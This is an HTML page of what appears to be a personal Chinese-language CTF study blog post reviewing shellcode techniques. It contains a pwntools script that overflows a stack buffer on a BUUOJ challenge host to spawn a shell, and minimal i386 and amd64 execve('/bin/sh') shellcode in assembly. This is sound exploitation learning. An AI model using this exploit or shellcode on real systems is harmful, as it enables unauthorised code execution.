@@ -1,0 +1,53 @@
+<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>pwn从头开始的复习（shellcode篇） | 未来大pwn子的blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
+  font-family: Bender;
+  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+  font-family: BenderLight;
+  src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+  font-family: 'JetBrains Mono';
+  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+</style><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy"}}</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>:root {
+ --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+ --light-background: url('/img/bk.jpg');
+ --theme-encrypt-confirm: 'confirm'
+}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
+window.mermaid = mermaid;
+code.paintMermaid();
+</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.0.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>pwn从头开始的复习（shellcode篇）</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-09-21T08:40:53.000Z" id="date"> 2023-09-21</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-09-21T08:55:08.435Z" id="updated"> 2023-09-21</time></div></span></div></div><hr><div id="post-content"><p>z</p>
+<h1 id="最简单的shellcode，写什么执行什么"><a href="#最简单的shellcode，写什么执行什么" class="headerlink" title="最简单的shellcode，写什么执行什么"></a>最简单的shellcode，写什么执行什么</h1><p>直接用shellcode.sh生成，再asm转换为二进制</p>
+<p><a href="%5Csource%5Cdownloads_fuxi%5Cshellcode1">例题下载</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"># remote()建立远程连接,指明ip和port</span><br><span class="line">io = remote(&#x27;node4.buuoj.cn&#x27;,28957)</span><br><span class="line">context(log_level = &quot;debug&quot;,arch = &quot;i386&quot;,os = &quot;linux&quot;)</span><br><span class="line">#io=process(&quot;./level1&quot;)</span><br><span class="line">io.recvuntil(&quot;What&#x27;s this:&quot;)</span><br><span class="line">buf_addr=io.recvuntil(b&quot;?&quot;)</span><br><span class="line">buf_addr= buf_addr[:-1]</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(140,b&#x27;a&#x27;)+p32(int(buf_addr, 16))</span><br><span class="line">io.sendline(payload) #发送数据</span><br><span class="line">io.interactive() #与shell进行交互</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="存在过滤的shellcode"><a href="#存在过滤的shellcode" class="headerlink" title="存在过滤的shellcode"></a>存在过滤的shellcode</h1><p>去我的分组对抗1看看，熊写了一道</p>
+<p>机器码对应汇编： <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43708844/article/details/103211703">https://blog.csdn.net/weixin_43708844/article/details/103211703</a></p>
+<h1 id="长度不足的shellcode"><a href="#长度不足的shellcode" class="headerlink" title="长度不足的shellcode"></a>长度不足的shellcode</h1><p>找目前最短的shellcode，有别的想法可以接着开发</p>
+<p>i386长度18</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push   0xb</span><br><span class="line">pop    eax</span><br><span class="line">push   ebx</span><br><span class="line">push   0x68732f2f</span><br><span class="line">push   0x6e69622f</span><br><span class="line">mov    ebx,esp</span><br><span class="line">int    0x80</span><br></pre></td></tr></table></figure>
+
+<p> amd64长度22</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor 	rsi,	rsi			</span><br><span class="line">push	rsi				</span><br><span class="line">mov 	rdi,	0x68732f2f6e69622f	 </span><br><span class="line">push	rdi</span><br><span class="line">push	rsp		</span><br><span class="line">pop	rdi				</span><br><span class="line">mov 	al,	59			</span><br><span class="line">cdq					</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/09/21/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88rop%E9%AB%98%E7%BA%A7%E7%AF%87%EF%BC%89/">← Next pwn从头开始的复习（rop高级篇）</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/21/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%EF%BC%89/">pwn从头开始的复习（工具使用） Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">heshi906</a></h1><div id="description"><p>大概只有漫不经心 才是唯一的解药</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84shellcode%EF%BC%8C%E5%86%99%E4%BB%80%E4%B9%88%E6%89%A7%E8%A1%8C%E4%BB%80%E4%B9%88"><span class="toc-number">1.</span> <span class="toc-text">最简单的shellcode，写什么执行什么</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%98%E5%9C%A8%E8%BF%87%E6%BB%A4%E7%9A%84shellcode"><span class="toc-number">2.</span> <span class="toc-text">存在过滤的shellcode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E4%B8%8D%E8%B6%B3%E7%9A%84shellcode"><span class="toc-number">3.</span> <span class="toc-text">长度不足的shellcode</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
